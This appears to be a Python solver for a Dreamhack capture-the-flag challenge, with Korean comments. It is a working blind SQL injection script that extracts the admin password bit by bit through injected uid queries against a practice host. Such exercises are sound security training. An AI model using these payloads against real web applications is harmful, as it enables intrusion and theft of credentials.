import requests

password_len=0
host="http://host3.dreamhack.games:19347"

while True:
    password_len+=1
    query=f"admin' and char_length(upw) = {password_len}-- -"
    url=f'{host}/?uid={query}'
    response=requests.get(url)
  
    if "exists" in response.text :
        break
    print(password_len)
# 패스워드 길이 알아냄.

flag=""
for i in range(1,password_len+1):
    bit_len=0
    while True:
        bit_len+=1
        query= f"admin' and length(bin(ord(substr(upw,{i},1))))={bit_len}-- -"
        url=f'{host}/?uid={query}'
        response=requests.get(url)
        if "exists" in response.text :
            break
    print(bit_len)
    # 비트 길이 알아냈음.
    bits=""
    for j in range(1,bit_len+1):
        query=f"admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)='1'-- -"
        url=f'{host}/?uid={query}'
        response=requests.get(url)
        if "exists" in response.text :
            bits=bits+"1"
        else:
            bits=bits+"0"
    print(bits)
    #비트 알아냈음.
    if bit_len <=8: # 아스키코드
        flag+=int.to_bytes(int(bits,2),1,byteorder="big").decode("utf-8")
    elif bit_len >16 and bit_len <=24: #한글
        flag+=int.to_bytes(int(bits,2),3,byteorder="big").decode("utf-8")

    print(flag)
print(flag)
